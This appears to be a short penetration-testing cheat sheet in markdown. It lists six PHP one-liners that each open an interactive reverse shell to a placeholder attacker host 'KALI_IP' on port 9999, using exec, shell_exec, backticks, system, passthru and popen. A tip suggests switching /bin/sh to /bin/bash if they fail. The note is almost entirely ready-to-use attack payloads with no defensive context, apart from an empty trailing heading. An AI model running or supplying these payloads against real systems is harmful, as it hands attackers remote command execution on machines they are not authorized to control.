---
title: 
tags:
---
## Command Line

```bash
php -r '$sock=fsockopen("KALI_IP",9999);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("KALI_IP",9999);shell_exec("/bin/sh <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("KALI_IP",9999);`/bin/sh -i <&3 >&3 2>&3`;'
```

```bash
php -r '$sock=fsockopen("KALI_IP",9999);system("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("KALI_IP",9999);passthru("/bin/sh -i <&3 >&3 2>&3");'
```

```bash
php -r '$sock=fsockopen("KALI_IP",9999);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

>[!tip] 
>If there are issues with these try switching out `/bin/sh` with `/bin/bash`

---
### Supporting Content
